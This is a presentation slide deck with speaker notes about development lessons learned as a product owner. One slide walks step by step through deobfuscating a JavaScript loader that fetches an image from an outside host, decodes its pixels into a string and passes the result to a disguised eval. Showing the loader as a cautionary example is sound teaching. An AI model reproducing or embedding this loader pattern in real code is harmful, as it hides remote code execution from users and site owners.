---
# try also 'default' to start simple
theme: apple-basic
layout: intro-image
image: ./images/patrick-fore-0gkw_9fy0eQ-unsplash.jpg
# https://cover.sli.dev
# some information about your slides, markdown enabled
title: X lessons from PO
info: |
  ## Slidev
  Presentation slides for developers.

  Learn more at [Sli.dev](https://sli.dev)
# apply any unocss classes to the current slide
# class: text-center
# https://sli.dev/custom/highlighters.html
highlighter: shiki
# https://sli.dev/guide/drawing
# drawings:
# persist: false
# slide transition: https://sli.dev/guide/animations#slide-transitions
transition: slide-left
# enable MDC Syntax: https://sli.dev/guide/syntax#mdc-syntax
mdc: true
---

<div class="absolute top-10">
  <span class="font-700">
    Artem Sakhatskiy, somewhere in Greece
  </span>
</div>

<div class="absolute bottom-10">
  <h1>X things about Development</h1>
  <p>I've learned while being a Product Owner</p>
</div>

<!--
Hey everyone, I'm Artem, and here we are, gathered together to chat about software development.
Now, I know we're all friends here, so if you have a question, just raise your hand -- I'll be answering them pretty regularly.

As someone who's been in the world of software development as both a developer and a product owner, I've gotta say, it has affected drastically on how I develop products.

So, today, I thought it'd be cool to share with you all some of the juiciest insights I've picked up. We're talking about the stuff they don't teach you on CodeAcademy — the lessons learned from being in the trenches.

Now, let's kick back, relax, and explore these nuggets of wisdom together. Get ready for some laughs, some "aha" moments, and maybe even a few head nods of agreement.

Sound good? Alrighty then, let's set sail!
-->

---
transition: fade-out
layout: center
---

# What were my responsibilities?

<div class="pt-10">
<v-clicks>

  - 🛠💻 **Hacking the product**
  - 🤹🧑 **Meeting clients**
  - 📈💰 **Owning P&L**
  - 🔮🧙 **Vision discovery**

</v-clicks>
</div>

<!--
So, what were my responsibilities?

[click] First there was the exciting task of hacking the product—of rolling up my sleeves and diving headfirst into the world of data, UX, and code. From brainstorming new features and troubleshooting bugs to collaborating with new subcontractors and external design teams, every day spent tinkering with the product was a lesson on it's own.
 
[click] Then, I had the privilege of meeting with clients—individuals from organizations whom we could help with our product. These meetings were more than just discussions; they were opportunities to understand needs, and to build (or ruin) relationships grounded in trust and collaboration.

[click] But meeting clients was just the beginning. I also had the responsibility for the profits and losses, being entrusted with the financial health and prosperity of our product. It was a responsibility that demanded foresight, strategic thinking, and a keen eye for opportunity -- all of which I somewhat lacked at the beginning. Yet, it was also a privilege—a testament to the trust placed in me by my team and stakeholders.

[click] But perhaps my most at time undervalued responsibility was that of vision discovery. With time passing we've expanded our core product with supportive add-ons, which later grew into separate products. More product owners joined our team, and more teams spawned, so we had to have a concise vision that would help all of us to align.
-->

---
layout: image
image: ./images/asch-experiment.png
---

---
layout: image-right
image: ./images/NOOO.gif
---

<h2 class="mt-40" style="font-size:26px">&mdash; No.<span v-click> How will it help?</span><span v-click="2"> = Yes *</span></h2>
<!-- <h2 style="font-size: 44px; line-height:50px">No</h2> -->

_Lesson I<span v-click="1">I</span><span v-click="2">I</span>_

<span v-click="2" style="position: absolute;right:12px;bottom:12px;font-size:12px;">* conditions apply, sometimes, with trade-offs, be unblockable</span>

<!--
Alright, folks, let's dive into my first lesson: being okay with saying "No." Now, I know what you're thinking—saying "No" isn't exactly everyone's favorite word, right? But hear me out.

As a product owner, you're like the gatekeeper of features and functionalities. You're bombarded with requests from stakeholders, users. And it's tempting to say "Yes" to everything, being a good guy. After all, you want to make everyone happy.

But here's the thing: saying "Yes" to every request will quickly lead you down a rabbit hole of scope creep, missed deadlines, and frustrated team members.

So, what's the solution? Learning to embrace the power of "No." Now, I'm not talking about being a buzzkill and shutting down every idea that comes your way. No, no, no. It's about being strategic and assertive in your decision-making.

Be decisive.

When faced with a new feature request or change in scope, ask yourself: Does this align with our product vision? Will it benefit our target users? Can we realistically implement it? If the answer is "No" to any of these questions, then it's okay to say "No".

By setting boundaries and managing expectations, you're not only protecting the integrity of your product but also fostering a culture of transparency and accountability within your team.

So, the next time you find yourself in a "Yes" or "No" dilemma, remember: it's not about being the bad guy, it's about building product for the purpose.

**AUDIENCE QUIESTONS?..**


Interesting enough, every time you need to say "No", you most probably are facing a users's problem you don't yet know.
People are intristicly good. They always try to help you, especially when you're a young start-up, interviewing face-to-face with a user.
They try to make your life easier by suggesting solutions, which usually is the source of ...interesting requests.

[click] Every time you need to say "No", you can continue with "But how will this help?"
"How" is the golden question. It forces people to uncover their problems, remembering incidents and modelling the situations they encounter in front of you.

? Example ?

This is a goldmine for upsales, feature improvement, and honest feedback collection.
More often then not following up on "No"s will lead to more trustworthy collaboration with the client.

[click] In a sence, one "No" can become multiple "Yes".. in future.. maybe.
-->

---
layout: intro-image-right
image: ./images/planning.jpg
---

<h2 style="font-size: 44px; line-height:50px">Plans are worthless<span v-click>, <br/>
    <span v-click="2" v-mark.red="2">re-</span>planning is <span class="pl-14">essential</span>
  </span>
</h2>

Lesson IV


<!--
Alright, let's explore a timeless lesson in software development: the nature of plans and planning.

Now, that's a common thing still worth repeating.

Plans feel like a map—they give you a sense of direction and guide you, but they're not set in stone. In the ever-changing landscape of software development, sticking too rigidly to a plan can be a recipe for disaster.

That's where planning comes in. Planning is not just about creating a static document and following it blindly—it's about the process of thinking, strategizing, and preparing for the challenges and opportunities that lie ahead.

By engaging in the planning process, you're not just outlining a series of steps to follow—you're also cultivating a mindset of adaptability and resilience. You're anticipating potential roadblocks and devising contingency plans to overcome them. You're collaborating with your team to brainstorm creative solutions and iterate on your approach as needed.

But here's the kicker: no matter how meticulously you plan, things will inevitably go south. Requirements will change, deadlines will shift, clients will drop out, and unexpected obstacles will crop up when you least expect them.
-->

<!--
And that's where the true value of planning comes into play. It's not about sticking to a rigid plan no matter what—it's about being prepared to pivot and adapt when the situation calls for it. It's about having the flexibility to overcome uncertainty and turn challenges into opportunities.

So, the next time you find yourself knee-deep in the planning process, remember: plans are useless, planning is important, but re-planning is essential. Embrace the process, stay agile, and be prepared to roll.
-->

---
layout: fact
---

<h2 style="font-size: 44px; line-height:50px">Build to throw away</h2>
Lesson 🗑️

<!--
Alright, let's talk about one of the golden rules of software development: building in a way that you can easily throw away. Now, I know what you're probably thinking: "Wait, why would I want to throw away something I've spent time and resources building?"

Change is the only constant. Requirements shift, technology evolves, and user feedback can send you back to the drawing board in one email. So, it's crucial to adopt a mindset of flexibility and adaptability in your development process.

Instead of clinging to your code like a shipwreck survivor to a raft, think of it more as a draft.

You want your code to be modular, scalable, and easy to dismantle and rearrange if needed. This means writing clean, well-documented code, embracing design patterns and best practices, and avoiding tightly-coupled dependencies like the plague.

By building with the mindset of "throwing away," you're not only future-proofing your codebase but also empowering your team to innovate and iterate with confidence. Need to pivot direction? No problem, you've built your code in a way that allows for seamless transitions and minimal disruption.

Now, I'm not saying you should be reckless and toss out your code willy-nilly at the first sign of trouble. No, it's about being proactive and intentional in your development approach. Think of it as building a sturdy foundation for a house—you want it to withstand the test of time and weather any storm that comes your way.

So, the next time you sit down to write some code, ask yourself: Is this something I can easily throw away and rebuild if needed? If the answer is yes, then you're on the right track to building software that's not just robust but also adaptable to whatever the future may hold.
-->

---
layout: fact
---

<h2 style="font-size: 44px; line-height:50px">Do mistakes, don't blunder</h2>
Lesson 💥

<!--


In software development, it's perfectly normal (and even expected) to encounter bumps along the road. After all, we're only human, and coding can be a complex and intricate dance of logic and syntax. But there's a difference between making a mistake and making a blunder.


80% of winnning is not blundering

Chess -> about blunders

I was born for failures.
Every fail-free success is a missed opportunity to learn.

A mistake might be a typo in your code, a logic error, or forgetting to test a certain edge case. These are the little hiccups that come with the territory, and they're usually easy to spot and fix with a bit of debugging and testing.

On the other hand, a blunder is a mistake on steroids. It's the kind of slip-up that sends shockwaves through your codebase, causing bugs to multiply like rabbits and deadlines to go up in smoke. Think of it as accidentally hitting the self-destruct button instead of the snooze alarm—yikes!

So, how do we avoid blunders while still embracing the inevitability of mistakes? It all comes down to a few key principles:

First, embrace a mindset of continuous improvement. Learn from your mistakes and use them as stepping stones to level up your skills and knowledge. Nobody expects you to be perfect, but they do expect you to learn and grow from your experiences.

Second, practice defensive coding. Write code that's robust, resilient, and resistant to errors. Use automated tests, code reviews, and static analysis tools to catch potential blunders before they wreak havoc on your project.

And finally, know when to ask for help. There's no shame in reaching out to a colleague or mentor when you're stuck or unsure about something. Two heads are better than one, and sometimes a fresh perspective is all you need to avoid a catastrophic blunder.

So, the next time you find yourself face-to-face with a mistake, remember: it's not the end of the world. Learn from it, grow from it, and whatever you do, don't let it escalate into a full-blown blunder. Your codebase—and your sanity—will thank you for it.
-->


---
layout: fact
---

<h2 style="font-size: 44px; line-height:50px">Don't Let Others Fail</h2>
Lesson V

<!--
Alright, let's delve into a crucial lesson in software development: the importance of supporting and uplifting your team members to prevent failure.

In the high-stakes world of software development, the pressure can sometimes feel like a pressure cooker ready to explode. Tight deadlines, complex problems, and ever-changing requirements can take their toll on even the most seasoned developers.

But here's the thing: you're not in this alone. As a team, your success is intertwined with the success of each and every member. And that means looking out for one another, lending a helping hand when needed, and not letting others fail.

Now, I'm not talking about swooping in like a superhero to save the day every time someone hits a roadblock. No, it's about creating a culture of support and collaboration where everyone feels empowered to ask for help and offer assistance when needed.

So, what does this look like in practice? It means checking in with your teammates regularly, offering encouragement and praise for their hard work, and being willing to step in and lend a hand when someone is struggling.

It also means advocating for resources, tools, and training to help your team succeed. Whether it's investing in better development tools, providing opportunities for professional development, or simply giving someone the time and space they need to recharge and refocus, it's all about setting your team up for success.

And perhaps most importantly, it means leading by example. Show your team what it means to be supportive, empathetic, and collaborative. Celebrate their successes, learn from their failures, and above all, let them know that you've got their back no matter what.

Because at the end of the day, your team is your greatest asset. And by lifting each other up and working together towards a common goal, you'll not only prevent failure but also achieve greatness beyond your wildest dreams.
-->


---
layout: fact
---

<h2 style="font-size: 44px; line-height:50px"><span v-mark.strike-through.red>Brutal</span> Honesty > Sugarcoating</h2>
Lesson VI + I/II

<!--
Alright, let's tackle a tough but essential lesson in software development: the value of brutal honesty over polite holdbacks.

Picture this: You're in a meeting, discussing a new feature or project, and someone proposes an idea that just doesn't sit right with you. Maybe it's technically unfeasible, maybe it's not aligned with the project's goals, or maybe it's just plain bad. What do you do?

Well, here's the thing: sugarcoating your feedback might spare someone's feelings in the short term, but in the long run, it can lead to wasted time, missed opportunities, and even project failure.

That's where brutal honesty comes into play. Now, I'm not saying you should be a jerk about it—far from it. But when it comes to giving feedback, especially when it's critical or constructive, it's better to be upfront and transparent than to beat around the bush.

So, how do you practice brutal honesty without burning bridges or bruising egos? It's all about framing your feedback in a constructive and respectful manner. Focus on the facts, provide specific examples or evidence to support your points, and offer suggestions for improvement or alternative solutions.

And remember, it's not just about pointing out what's wrong—it's also about recognizing and acknowledging what's right. If someone on your team has done a stellar job, don't hold back on the praise. Positive reinforcement can be just as powerful as constructive criticism in shaping behavior and driving performance.

By embracing brutal honesty, you're fostering a culture of transparency, accountability, and continuous improvement within your team. You're empowering your colleagues to speak up, challenge the status quo, and push the boundaries of what's possible.

So, the next time you find yourself in a situation where honesty is called for, remember: being polite might spare someone's feelings, but being brutally honest can spare your project from disaster.
-->


---
layout: fact
---

<h2 style="font-size: 44px; line-height:50px">Test Riskiest Assumptions</h2>
Lesson VII

<!--

So, what exactly are these risky assumptions? Well, they're the things you're betting the farm on—the core hypotheses that underpin your project's success. Maybe you're assuming that users will love your new feature, or that your technology stack will scale to meet demand, or that your marketing strategy will attract droves of customers.

Whatever the assumption may be, it's critical to test it early and often. That means gathering real-world data, conducting user interviews, running experiments, and challenging your assumptions at every turn.

Now, I get it—testing assumptions can be scary. What if you uncover a fatal flaw in your plan? What if your assumptions turn out to be dead wrong? Well, here's the thing: it's far better to uncover those flaws early on than to barrel ahead blindly and crash into a brick wall later down the road.

By testing your riskiest assumptions, you're not only mitigating the potential for failure but also laying the foundation for a more robust and resilient project. You're embracing uncertainty and using it as a catalyst for innovation and growth.

So, the next time you find yourself making assumptions, ask yourself: which ones are the riskiest? And what can I do to test them? It might just be the difference between a project that soars and one that crashes and burns.
-->


---
layout: fact
---

<h2 style="font-size: 44px; line-height:50px">Deliver Value</h2>
Lesson VIII

<!--
Alright, let's dive into a critical lesson in product ownership: understanding how your product delivers value.

So, what does it mean to know how your product delivers value?

-->

---

## Lesson VIII: Deliver Value

<p class="pt-24">
As a product <span v-mark.strike-through.red="5">owner</span><span v-click="5"> developer</span>
</p>

<v-clicks>

- manage features and functionalities
- know how your product solves problems for your users
- know what sets your product apart
- understand why it matters

</v-clicks>

<!--
As a product owner, you're not just responsible for managing features and functionalities — you need to know what sets your product apart, how it solves problems for your users, and why it matters in the grand scheme of things.

So, people, give me your suggestions, how a product owner might achieve these goals?

**AUDIENCE**


First and foremost, it's about understanding your users inside and out. Who are they? What are their pain points? What are they trying to accomplish? By immersing yourself in the world of your users, you can gain invaluable insights into how your product can make their lives better.

Next, it's about understanding the broader context in which your product operates. What are the market trends? Who are your competitors? What are the regulatory considerations? By staying informed about the external factors that impact your product, you can better position it for success and anticipate potential challenges.

But perhaps most importantly, knowing how your product delivers value means having a deep understanding of your product's unique value proposition. What makes it special? What problem does it solve? What benefits does it offer to your users? By embracing your product's value proposition, you and your team  align around a shared vision and get inspired to deliver **value**.

By knowing how your product delivers value, you're not just a software developer — you're a value creator, a problem solver, and a champion for your users.
So, the next time you're making decisions about your product, remember to keep the value proposition front and center. Because when you know how your product delivers value, you're not just building software — you're affecting businesses and in turn lives of other people.
-->

---
layout: intro-image
image: ./images/Sammy.avif
---

<div style="margin-top:120px" />

# Don't Do<br/> Shady Stuff
Lesson IX

<!--
Alright, let's address a straightforward but crucial lesson in software development: integrity and honesty.

In the fast-paced world of technology, it can be tempting to cut corners, bend the truth, or engage in shady practices to meet deadlines or gain a competitive edge. But here's the thing: honesty and integrity are non-negotiables when it comes to building trust and credibility with your team, your users, and your stakeholders.

First and foremost, don't bullshit. Excuse my language, but there's no better way to put it. Be upfront and transparent about the challenges and limitations of your project. If something isn't working or if there's a roadblock that needs addressing, own up to it and communicate openly with your team and stakeholders. Sweeping problems under the rug or sugarcoating the truth might buy you some time in the short term, but it'll inevitably come back to haunt you in the long run.

Secondly, don't do shady stuff. This should go without saying, but it bears repeating. Whether it's manipulating data, plagiarizing code, or engaging in unethical business practices, taking shortcuts or cutting corners will only tarnish your reputation and erode trust with your users and stakeholders. Remember, trust is hard to earn and easy to lose. So, always strive to conduct yourself with integrity and uphold the highest ethical standards in everything you do.

By embracing honesty and integrity in your work, you're not just building software—you're building trust, credibility, and lasting relationships with your team and your community. So, the next time you're faced with a moral dilemma or a temptation to take the easy way out, remember: don't bullshit, and don't do shady stuff. Your conscience—and your reputation—will thank you for it.
-->

---
---

### What does this do?

````md magic-move
```ts
function(e) {
  var t = function(e) {
      return String.fromCharCode(e)
  };
  if (function(e) {
      return /\x61\x70\x69\x2E\x72\x65\x65\x73\x34\x36\x2E\x63\x6F\x6D/.test(e)
  }(e[i])) {
    o = new Image,
    o.onload = function(e, r) {
        var i = r.getContext("2d");
        var n = i
          .drawImage(this, 0, 0)
          .getImageData(0, 0, this.naturalWidth, this.naturalHeight)
          .data
        var u = "";
        for (s = 0, a = o.length; s < a; s++)
            if (!(s % 4 == 3 && s > 0)) {
              return u += String.fromCharCode(~-e)
            }
        try {
            window[t(101) + "val"](u)
        } catch (e) {}
    },
    o.src = e[i]
}
```

```ts
function(e) {
  var fromCharCode = String.fromCharCode(e);

  if (function(e) {
      return /\x61\x70\x69\x2E\x72\x65\x65\x73\x34\x36\x2E\x63\x6F\x6D/.test(e)
  }(e[i])) {
    o = new Image,
    o.onload = function(e, r) {
        var i = r.getContext("2d");
        var n = i
          .drawImage(this, 0, 0)
          .getImageData(0, 0, this.naturalWidth, this.naturalHeight)
          .data
        var u = "";
        for (s = 0, a = o.length; s < a; s++)
            if (!(s % 4 == 3 && s > 0)) {
              return u += String.fromCharCode(~-e)
            }
        try {
            window[fromCharCode(101) + "val"](u)
        } catch (e) {}
    },
    o.src = e[i]
}
```

```ts
function(e) {
  var fromCharCode = String.fromCharCode(e);
  
  if (function(e) {
      return "api.rees64.ru".test(e)
  }(e[i])) {
    o = new Image,
    o.onload = function(e, r) {
        var i = r.getContext("2d");
        var n = i
          .drawImage(this, 0, 0)
          .getImageData(0, 0, this.naturalWidth, this.naturalHeight)
          .data
        var u = "";
        for (s = 0, a = o.length; s < a; s++)
            if (!(s % 4 == 3 && s > 0)) {
              return u += String.fromCharCode(~-e)
            }
        try {
            window[fromCharCode(101) + "val"](u)
        } catch (e) {}
    },
    o.src = e[i]
}
```

```ts
function(e) {
  var fromCharCode = String.fromCharCode(e);
  
  if ("api.rees64.ru".test(e[i])) {
    o = new Image,
    o.onload = function(e, r) {
        var i = r.getContext("2d");
        var n = i
          .drawImage(this, 0, 0)
          .getImageData(0, 0, this.naturalWidth, this.naturalHeight)
          .data
        var u = "";
        for (s = 0, a = o.length; s < a; s++)
            if (!(s % 4 == 3 && s > 0)) {
              return u += String.fromCharCode(~-e)
            }
        try {
            window[fromCharCode(101) + "val"](u)
        } catch (e) {}
    },
    o.src = e[i]
}
```

```ts {*|8-11|12-16}
function({ link }) {
  var fromCharCode = String.fromCharCode(e);
  
  if ("api.rees64.ru".test(link)) {
    o = new Image,
    o.onload = function(e, r) {
        var i = r.getContext("2d");
        var n = i
          .drawImage(this, 0, 0)
          .getImageData(0, 0, this.naturalWidth, this.naturalHeight)
          .data;
        var u = "";
        for (s = 0, a = o.length; s < a; s++)
            if (!(s % 4 == 3 && s > 0)) {
              return u += String.fromCharCode(~-e)
            }
        try {
            window[fromCharCode(101) + "val"](u)
        } catch (e) {}
    },
    o.src = link
}
```

```ts
function({ link }) {
  var fromCharCode = String.fromCharCode(e);
  
  if ("api.rees64.ru".test(link)) {
    o = new Image,
    o.onload = function(e, r) {
        var i = r.getContext("2d");
        var n = i
          .drawImage(this, 0, 0)
          .getImageData(0, 0, this.naturalWidth, this.naturalHeight)
          .data
        var imageBytesToString = "...";
        try {
            window[fromCharCode(101) + "val"](imageBytesToString)
        } catch (e) {}
    },
    o.src = link
}
```

```ts
function({ link }) {
  var fromCharCode = String.fromCharCode(e);
  
  if ("api.rees64.ru".test(link)) {
    o = new Image,
    o.onload = function(e, r) {
        var i = r.getContext("2d");
        var n = i
          .drawImage(this, 0, 0)
          .getImageData(0, 0, this.naturalWidth, this.naturalHeight)
          .data
        var imageBytesToString = "...";
        try {
            window["eval"](imageBytesToString)
        } catch (e) {}
    },
    o.src = link
}
```
````

---
layout: fact
---


<h2 style="font-size: 44px; line-height:50px">Acknowledge and Celebrate Success</h2>
Lesson X

<!--
Alright, let's wrap up our journey through software development with a lesson that's all about recognizing and appreciating the victories, big and small.

In the fast-paced world of software development, it's easy to get caught up in the never-ending cycle of deadlines, bug fixes, and feature requests. But amidst the chaos, it's important to take a step back and acknowledge the wins—the milestones achieved, the goals reached, and the obstacles overcome.

Why? Because celebrating success isn't just about patting ourselves on the back—it's about fostering a culture of positivity, motivation, and camaraderie within our team. It's about recognizing the hard work, dedication, and ingenuity that goes into every line of code, every design iteration, and every user interaction.

So, how do we acknowledge and celebrate success? Well, it can be as simple as a shoutout in a team meeting, a high-five in the hallway, or a celebratory happy hour at the end of a sprint. It can also be more formal, like a team-wide recognition program, an awards ceremony, or even a company-wide announcement highlighting major achievements.

But regardless of the form it takes, the key is sincerity and authenticity. Celebrate not just the outcomes, but also the effort, the collaboration, and the resilience that led to those outcomes. And don't forget to involve everyone in the celebration—after all, success is a team effort, and everyone deserves to share in the glory.

By acknowledging and celebrating success, we're not just boosting morale and motivation—we're also reinforcing a culture of excellence and achievement that will propel us forward on our journey through software development. So, the next time you achieve a milestone or reach a goal, take a moment to pause, reflect, and celebrate the journey. You've earned it.
-->

---
layout: center
class: text-center
---

# And another 8382 lessons...

Questions?

